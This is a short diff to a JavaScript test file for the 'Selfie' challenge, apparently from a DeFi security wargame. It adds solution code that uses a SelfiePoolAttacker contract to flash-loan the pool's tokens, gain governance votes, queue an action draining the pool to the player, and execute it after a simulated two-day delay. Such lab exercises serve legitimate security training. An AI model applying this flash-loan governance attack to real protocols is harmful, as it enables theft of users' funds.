@@ -31,6 +31,7 @@ describe('[Challenge] Selfie', function () {
         // Fund the pool
         await token.transfer(pool.address, TOKENS_IN_POOL);
         await token.snapshot();
+
         expect(await token.balanceOf(pool.address)).to.be.equal(TOKENS_IN_POOL);
         expect(await pool.maxFlashLoan(token.address)).to.eq(TOKENS_IN_POOL);
         expect(await pool.flashFee(token.address, 0)).to.eq(0);
@@ -39,6 +40,16 @@ describe('[Challenge] Selfie', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        let selfiePoolAttacker = await (await ethers.getContractFactory('SelfiePoolAttacker', deployer)).deploy(pool.address);
+        
+        // flashloan the token(DamnValuableTokenSnapshot) then have enough votes making an action which transfer all token to the player's address
+        await selfiePoolAttacker.connect(player).attack(pool.address);
+        
+        // after two days, execute the action
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
+        await governance.executeAction(1);
+
     });
 
     after(async function () {
